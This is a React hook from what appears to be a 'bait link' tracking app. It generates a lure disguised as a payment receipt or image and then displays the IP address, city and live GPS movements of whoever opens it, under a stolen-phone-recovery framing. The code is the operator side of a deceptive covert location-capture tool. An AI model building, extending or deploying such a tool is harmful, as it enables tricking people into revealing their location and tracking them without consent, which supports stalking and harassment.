// src/hooks/useTracker.js — UPDATED: handles continuous watchPosition updates
import { useState, useEffect, useCallback, useRef } from 'react';
import { createBaitSession } from '../lib/api';
import { socket, watchSession, unwatchSession } from '../lib/socket';

export function useTracker() {
  const [session,     setSession]     = useState(null);
  const [captures,    setCaptures]    = useState([]);
  const [latest,      setLatest]      = useState(null);
  const [timeline,    setTimeline]    = useState([
    { time: '14:32', event: 'Device reported STOLEN — Yaoundé', type: 'danger' },
    { time: '14:33', event: 'TRACKING initiated by owner',      type: 'warn'   },
  ]);
  const [pingCount,   setPingCount]   = useState(0);
  const [generating,  setGenerating]  = useState(false);
  const [toast,       setToast]       = useState(null);
  const [showModal,   setShowModal]   = useState(false);
  const [imageB64,    setImageB64]    = useState(null);
  const toastTimer = useRef(null);

  const showToast = useCallback((msg, type = 'success') => {
    clearTimeout(toastTimer.current);
    setToast({ msg, type });
    toastTimer.current = setTimeout(() => setToast(null), 3500);
  }, []);

  const addEvent = useCallback((event, type = 'warn') => {
    const time = new Date().toTimeString().slice(0, 5);
    setTimeline(prev => [{ time, event, type }, ...prev].slice(0, 30));
  }, []);

  // ── Socket: listen for location updates ───────────────────────
  useEffect(() => {
    socket.on('location_captured', (data) => {
      setCaptures(prev => [data, ...prev]);
      setLatest(data);
      setPingCount(prev => prev + 1);

      if (data.isFirst) {
        // First capture — show the big modal
        setShowModal(true);
        addEvent(`🎯 BAIT OPENED — ${data.ipCity || 'Unknown city'} · IP: ${data.ip}`, 'success');
      } else {
        // Subsequent updates — just update map silently
        addEvent(`📍 MOVED — ${data.lat?.toFixed(4)}, ${data.lng?.toFixed(4)} · ±${data.accuracy}m · ${data.realGPS ? '🛰 GPS' : '📡 NET'}`, 'warn');
      }
    });

    return () => socket.off('location_captured');
  }, [addEvent]);

  // ── Watch session when generated ──────────────────────────────
  useEffect(() => {
    if (session?.sessionId) {
      watchSession(session.sessionId);
      return () => unwatchSession(session.sessionId);
    }
  }, [session?.sessionId]);

  // ── Generate bait session ─────────────────────────────────────
  const generateBait = useCallback(async ({ amount, sender, message }) => {
    setGenerating(true);
    try {
      const mode = imageB64 ? 'image' : 'receipt';
      const { data } = await createBaitSession({ amount, sender, message, mode, imageData: imageB64 });
      setSession(data.session);
      addEvent(`⚡ BAIT GENERATED — Session ${data.session.sessionId}`, 'success');
      showToast('✅ Bait link ready — copy and send it manually');
      return data;
    } catch (err) {
      showToast('❌ Failed: ' + err.message, 'error');
      throw err;
    } finally {
      setGenerating(false);
    }
  }, [imageB64, addEvent, showToast]);

  return {
    session, captures, latest, timeline, pingCount,
    generating, toast, showModal, setShowModal,
    imageB64, setImageB64,
    generateBait, addEvent, showToast,
  };
}
